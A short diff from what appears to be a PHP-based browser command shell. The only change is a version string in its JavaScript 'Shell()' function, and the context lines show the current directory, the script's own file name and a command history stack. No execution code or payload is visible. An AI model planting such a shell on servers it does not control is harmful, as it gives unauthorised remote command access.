@@ -146,7 +146,7 @@ function echoJS()
 	};
 
 	function Shell(){
-		var snoc_version = "1.0 Brand New Beta (tm)";
+		var snoc_version = "1.01 Brand New Beta (tm)";
 		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
 		var self_name = window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);
 		var history = new Array();				// command history stack
